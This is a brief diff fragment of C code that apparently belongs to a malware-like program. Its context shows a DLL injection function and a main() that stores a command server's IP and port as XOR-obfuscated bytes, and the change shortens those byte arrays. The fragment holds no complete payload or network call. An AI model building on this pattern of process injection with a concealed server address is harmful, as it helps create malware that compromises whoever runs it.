@@ -45,8 +45,8 @@ BOOL inject_dll(HANDLE process, const char *dllPath) {
 }
 
 int main() {
-    char server_ip[] = {0x12, 0x34, 0x56, 0x78, 0x00}; // Encrypted IP
-    char server_port[] = {0xAB, 0xCD, 0x00}; // Encrypted port
+    char server_ip[] = {0x12, 0x78, 0x00}; // Encrypted IP
+    char server_port[] = {0xAB, 0x00}; // Encrypted port
     char key[] = "ComplexKey"; // Complex key
 
     xor_encrypt_decrypt(server_ip, key);
